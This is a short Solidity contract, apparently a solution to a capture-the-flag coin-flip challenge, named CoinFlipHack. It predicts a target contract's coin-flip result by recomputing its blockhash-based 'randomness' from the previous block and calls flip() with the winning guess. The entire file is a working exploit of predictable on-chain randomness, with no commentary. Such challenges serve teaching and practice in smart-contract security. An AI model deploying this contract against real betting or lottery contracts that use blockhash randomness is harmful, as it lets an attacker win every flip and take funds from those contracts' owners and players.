// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface CoinFlipInterface {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    using SafeMath for uint256;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipAddress;

    constructor(address _coinFlipAddress) {
        coinFlipAddress = _coinFlipAddress;
    }

    function hackCoinFlip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        CoinFlipInterface(coinFlipAddress).flip(side);
    }
}
